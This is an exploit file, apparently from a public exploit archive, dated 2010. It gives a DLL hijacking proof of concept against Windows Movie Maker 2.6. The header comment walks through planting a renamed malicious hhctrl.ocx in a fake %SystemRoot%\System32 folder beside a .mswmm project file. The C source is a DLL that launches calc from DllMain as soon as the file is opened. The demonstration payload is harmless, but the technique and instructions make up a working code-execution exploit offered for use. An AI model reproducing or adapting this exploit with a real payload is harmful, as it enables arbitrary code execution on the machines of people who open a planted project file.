/*
Exploit Title: Microsoft Windows Movie Maker <= 2.6.4038.0 DLL Hijacking Exploit (hhctrl.ocx)
Date: 24/08/2010
Author: TheLeader
Email: gsog2009 [a7] hotmail [d0t] com
Software Link: http://www.microsoft.com/downloads/details.aspx?FamilyID=d6ba5972-328e-4df7-8f9d-068fc0f80cfc&displaylang=en
Version: 2.6.4038.0 and prior
Tested on: Windows 7 x86 (6.1.7600)

There is a way more interesting bug there in which the program tries to load a driver file.
It's in investigation, but has a nice potential for a nastier vulnerability.
Meanwhile, enjoy =]

Instructions:
1. Create a file with the following extension: .mswmm
2. Compile this library and rename it to hhctrl.ocx
2. On the same directory of the .mswmm file, create a directory called: %SystemRoot%
3. Inside %SystemRoot%, create a directory called: System32
4. Move hhctrl.ocx into the System32 directory that you have just created
5. Open the .mswmm file and enjoy the fireworks =]

*Whispers* to all the great guys at forums.hacking.org.il
*/

#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  evil();
  return 0;
}
